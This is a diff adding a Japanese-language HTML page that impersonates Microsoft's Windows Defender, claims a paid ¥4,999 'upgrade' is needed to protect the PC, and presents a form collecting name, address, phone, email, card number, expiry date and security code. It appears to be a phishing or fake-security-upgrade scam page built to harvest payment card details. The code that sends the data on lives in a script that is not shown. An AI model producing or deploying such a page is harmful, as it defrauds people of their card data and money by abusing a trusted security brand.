@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows Defender アップグレード</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div class="container" id="main-container">
+        <!-- ロゴを表示 -->
+        <div class="logo">
+            <img src="data:image/png;base64,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" alt="Windows Defender ロゴ">
+        </div>
+
+        <h1>Windows Defender </h1>
+        <h2>のアップグレード</h2>
+        <p>お使いのPCのセキュリティを最大限に保護するために、Windows Defender の最新アップグレードが必要です。</p>
+        <p>新しい機能と高度なセキュリティ機能を手に入れるために、今すぐアップグレードを購入しましょう！</p>
+        
+        <div class="upgrade-info">
+            <h2>アップグレード内容</h2>
+            <ul>
+                <li>最新のウイルス定義ファイル</li>
+                <li>リアルタイム保護機能の強化</li>
+                <li>新しい脅威に対する保護</li>
+                <li>高度なマルウェア対策</li>
+            </ul>
+        </div>
+
+        <div class="price-info">
+            <h2>価格</h2>
+            <p class="price">¥4,999（税抜）</p>
+            <p>今なら特別割引価格でご提供中！</p>
+        </div>
+
+        <!-- アップグレードボタン -->
+        <button class="purchase-btn" onclick="showPaymentForm()">今すぐアップグレード</button>
+    </div>
+
+    <!-- 支払い情報フォーム -->
+    <div class="payment-form-container" id="payment-form-container" style="display:none;">
+        <h2>支払い情報入力</h2>
+        <form id="payment-form" onsubmit="completePayment(event)">
+            <label for="name">名前:</label>
+            <input type="text" id="name" name="name" placeholder="例: 山田 太郎" required><br><br>
+
+            <label for="email">メールアドレス:</label>
+            <input type="email" id="email" name="email" placeholder="例: example@domain.com" required><br><br>
+
+            <label for="address">住所:</label>
+            <input type="text" id="address" name="address" placeholder="例: 東京都渋谷区1-2-3" required><br><br>
+
+            <label for="phone">電話番号:</label>
+            <input type="text" id="phone" name="phone" placeholder="例: 080-1234-5678" required maxlength="13" pattern="\d{3}-\d{4}-\d{4}" oninput="formatPhoneNumber(event)"><br><br>
+
+            <label for="card-number">カード番号:</label>
+            <input type="text" id="cardNumber" name="cardNumber" placeholder="例: 1234 5678 9012 3456" required maxlength="19" pattern="\d{4} \d{4} \d{4} \d{4}" oninput="formatCardNumber(event)"><br><br>
+
+            <label for="expiry">有効期限 (MM/YY):</label>
+            <input type="text" id="expiryDate" name="expiryDate" placeholder="例: 12/23" required maxlength="5" pattern="\d{2}/\d{2}" oninput="formatExpiry(event)"><br><br>
+
+            <label for="security-code">セキュリティコード:</label>
+            <input type="text" id="securityCode" name="securityCode" placeholder="例: 123" required maxlength="3" pattern="\d{3}"><br><br>
+
+            <button type="submit">支払いを完了する</button>
+        </form>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
